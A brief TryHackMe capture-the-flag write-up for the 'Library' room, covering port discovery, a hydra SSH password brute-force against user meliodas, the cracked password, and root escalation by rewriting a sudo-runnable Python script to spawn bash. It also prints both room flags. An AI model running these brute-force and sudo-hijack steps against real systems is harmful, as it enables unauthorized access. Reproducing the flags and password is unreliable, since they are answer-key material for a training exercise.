## **Room:** [Library](https://tryhackme.com/room/bsidesgtlibrary)
---

> **Prompt**
>
> > Read user.txt and root.txt

Host: 10.201.51.214

Open Port: 22,80
Open Directory: /images, /server-status
Som I have noticed that the html is posted by meliodas, so I used brute force to ge the password through ssh:
```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.201.51.214 ssh
```
The password was: iloveyou1
Then, I login into his account and found the first flag of the day: 6d488cbb3f111d135722c33cb635f4ec
Therefore, there was a bak.py, in his profile:
So, based on the preference: https://cryptichacker.github.io/posts/library/
I used sudo -l to get the files that can run by root:
And changed the bak.py value into:
```
import pty;pty.spawn('/bin/bash')
```
This command basically opens a proper interactive Bash shell inside a pseudo-terminal, which upgrades a basic, limited remote shell
And run it like the format what sudo -l gave:
```bash
sudo python /home/meliodas/bak.py
```
Eventually, I successfully entered the root. And got the final flag of the day: e8c8c6c256c35515d1d344ee0488c617






